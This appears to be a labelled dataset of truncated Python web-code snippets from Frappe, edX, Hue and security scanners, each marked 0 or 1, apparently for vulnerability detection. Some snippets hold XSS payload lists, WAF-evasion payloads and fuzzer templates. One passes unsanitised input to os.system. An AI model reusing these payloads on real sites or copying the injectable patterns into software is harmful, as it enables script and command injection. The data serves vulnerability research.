{"snippet_id": 33918, "code": "('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append(", "label": 0}, {"snippet_id": 54709, "code": "=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self.request", "label": 0}, {"snippet_id": 52366, "code": "=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')", "label": 0}, {"snippet_id": 43968, "code": "(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True:", "label": 0}, {"snippet_id": 14781, "code": ") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self", "label": 1}, {"snippet_id": 37049, "code": " \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1", "label": 0}, {"snippet_id": 29729, "code": "=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs", "label": 0}, {"snippet_id": 33520, "code": "\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate", "label": 0}, {"snippet_id": 46381, "code": "')) layout=json.loads(request.POST.get('layout', '{}')) collection['template']['extracode']=escape(collection['template']['extracode']) if collection: if collection['id']: dashboard_doc=Document2.objects", "label": 0}, {"snippet_id": 30674, "code": " \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file", "label": 0}, {"snippet_id": 17732, "code": ".create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change", "label": 0}, {"snippet_id": 52450, "code": "{'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows", "label": 0}, {"snippet_id": 42005, "code": "(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value", "label": 0}, {"snippet_id": 54342, "code": " crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row=2, column=1) method.current(0", "label": 0}, {"snippet_id": 38123, "code": " frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered", "label": 1}, {"snippet_id": 20301, "code": " terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return ", "label": 0}, {"snippet_id": 5238, "code": "\n from saker.fuzzers.fuzzer import Fuzzer _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote", "label": 0}, {"snippet_id": 35436, "code": " not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name", "label": 0}, {"snippet_id": 35009, "code": " \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t", "label": 0}, {"snippet_id": 6036, "code": ", 'logfile': None, 'syslog_socket': None, 'listen_addr': '0.0.0.0', 'listen_port': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir", "label": 0}, {"snippet_id": 15359, "code": " self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs", "label": 0}, {"snippet_id": 41549, "code": " import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe", "label": 0}, {"snippet_id": 14541, "code": " unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR", "label": 0}, {"snippet_id": 43997, "code": "\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) ", "label": 0}, {"snippet_id": 31537, "code": "=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[2]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['conn']=str(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\"", "label": 0}, {"snippet_id": 10419, "code": "', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command", "label": 0}, {"snippet_id": 41796, "code": ".set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key,", "label": 0}, {"snippet_id": 6489, "code": " get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value, plus the pysaml2", "label": 0}, {"snippet_id": 2003, "code": "=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\":", "label": 0}, {"snippet_id": 39848, "code": ".docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df", "label": 0}, {"snippet_id": 54813, "code": "'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context", "label": 0}, {"snippet_id": 37924, "code": " Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published)", "label": 0}, {"snippet_id": 39605, "code": "(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df", "label": 0}, {"snippet_id": 20402, "code": ".get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course", "label": 0}, {"snippet_id": 12952, "code": "('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON", "label": 0}, {"snippet_id": 31622, "code": "\t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) ", "label": 0}, {"snippet_id": 51139, "code": "=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)", "label": 0}, {"snippet_id": 19761, "code": " for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run", "label": 0}, {"snippet_id": 36920, "code": "\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True", "label": 0}, {"snippet_id": 5918, "code": "=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload", "label": 0}, {"snippet_id": 200, "code": " xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload", "label": 1}, {"snippet_id": 18016, "code": "'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create", "label": 0}, {"snippet_id": 39003, "code": "[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d", "label": 0}, {"snippet_id": 21668, "code": "[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups", "label": 0}, {"snippet_id": 48331, "code": "(request.GET.get(\"article_id\")) quantity: int=int(request.POST[\"quantity\"]) notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar.AID=Article.objects.get(id=aid) ar.RID=current_reservation if \"srid", "label": 1}, {"snippet_id": 12490, "code": ".take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 12624, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns ", "label": 0}, {"snippet_id": 17462, "code": " ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ", "label": 0}, {"snippet_id": 51078, "code": "') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return obj.total_run_count", "label": 0}, {"snippet_id": 23480, "code": "'openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns", "label": 0}, {"snippet_id": 30083, "code": " name) \ttry: \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct.logging(serv, \"add.py \t if form.getvalue('backend') is not None: \tfunct.show_backends", "label": 0}, {"snippet_id": 49404, "code": ": selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None: return True return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self, model", "label": 0}, {"snippet_id": 7032, "code": "'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views", "label": 0}, {"snippet_id": 27565, "code": " methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for", "label": 0}, {"snippet_id": 38405, "code": " comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db", "label": 0}, {"snippet_id": 33779, "code": ".blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe", "label": 1}, {"snippet_id": 2160, "code": " not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url", "label": 0}, {"snippet_id": 52645, "code": ".union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=", "label": 0}, {"snippet_id": 7265, "code": " name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name", "label": 0}, {"snippet_id": 48058, "code": " upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name=upload_base_path +'/LOWRES_' +ntpath.basename", "label": 0}, {"snippet_id": 6759, "code": " front of the IdP it might be required to specify the URL of the service. \"\"\" return self.config.get(self.section, 'base_url') @property def default_eppn_scope(self): \"\"\" The scope to append to any unscoped", "label": 0}, {"snippet_id": 10208, "code": ".assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self)", "label": 0}, {"snippet_id": 3986, "code": ", \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads", "label": 0}, {"snippet_id": 18481, "code": " name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 34445, "code": " as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key,", "label": 0}, {"snippet_id": 46694, "code": ".items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']),", "label": 0}, {"snippet_id": 27049, "code": ")): for j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range", "label": 0}, {"snippet_id": 18206, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r", "label": 1}, {"snippet_id": 47636, "code": ".add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if", "label": 0}, {"snippet_id": 38535, "code": "\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", ", "label": 0}, {"snippet_id": 12432, "code": ".save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 24354, "code": " cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes", "label": 0}, {"snippet_id": 16674, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r", "label": 1}, {"snippet_id": 16776, "code": "<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$", "label": 1}, {"snippet_id": 50104, "code": " remove) for csessid,(t, remove) in self.last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True)", "label": 0}, {"snippet_id": 22491, "code": "(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), ", "label": 0}, {"snippet_id": 36911, "code": ".form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route", "label": 1}, {"snippet_id": 24270, "code": ".utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False", "label": 0}, {"snippet_id": 4877, "code": "\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script", "label": 1}, {"snippet_id": 14408, "code": "(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^", "label": 0}, {"snippet_id": 19314, "code": ": suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 13217, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat", "label": 0}, {"snippet_id": 51468, "code": " 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting', 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static", "label": 0}, {"snippet_id": 46981, "code": " Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments", "label": 0}, {"snippet_id": 34304, "code": " in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype", "label": 0}, {"snippet_id": 54418, "code": "(row=11, column=0, sticky=W, pady=4) Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4) Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4) Label", "label": 0}, {"snippet_id": 48779, "code": " django.utils.formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import", "label": 0}, {"snippet_id": 12900, "code": "]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args", "label": 0}, {"snippet_id": 26334, "code": ".format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ", "label": 0}, {"snippet_id": 31310, "code": "} \t\t\tmetrics[rep_date]['server']=str(i[0]) \t\t\tmetrics[rep_date]['curr_con']=str(i[1]) \t\t\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t\tmetrics[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate", "label": 0}, {"snippet_id": 47824, "code": " pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName", "label": 1}, {"snippet_id": 18451, "code": "[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook", "label": 0}, {"snippet_id": 52342, "code": " layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid", "label": 0}, {"snippet_id": 48661, "code": ".POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else", "label": 1}, {"snippet_id": 36652, "code": " \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: ", "label": 0}, {"snippet_id": 9815, "code": "/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views", "label": 0}, {"snippet_id": 50216, "code": "[csessid]=dataentries def client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if csessid in self.requests: self.requests[csessid].finish() del", "label": 0}, {"snippet_id": 42538, "code": " \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062", "label": 0}, {"snippet_id": 10831, "code": "(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean", "label": 0}, {"snippet_id": 53397, "code": " json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status':", "label": 0}, {"snippet_id": 23104, "code": " 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list", "label": 0}, {"snippet_id": 400, "code": " \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list", "label": 0}, {"snippet_id": 53597, "code": " _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle", "label": 0}, {"snippet_id": 11863, "code": ".render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'),", "label": 0}, {"snippet_id": 44846, "code": ".union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=", "label": 0}, {"snippet_id": 3015, "code": " xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT'", "label": 0}, {"snippet_id": 43267, "code": ".CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key", "label": 0}, {"snippet_id": 40409, "code": ".get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef", "label": 0}, {"snippet_id": 15296, "code": "*kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir", "label": 0}, {"snippet_id": 40437, "code": "'*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param", "label": 0}, {"snippet_id": 25608, "code": "['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'), initial=(cartpos.attendee_name_parts", "label": 0}, {"snippet_id": 6138, "code": " debug): self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config", "label": 0}, {"snippet_id": 34092, "code": " unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email,", "label": 0}, {"snippet_id": 4775, "code": "'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ]", "label": 0}, {"snippet_id": 19732, "code": "=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir ", "label": 0}, {"snippet_id": 35612, "code": " value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It", "label": 0}, {"snippet_id": 10706, "code": " in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http", "label": 0}, {"snippet_id": 36915, "code": "=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": 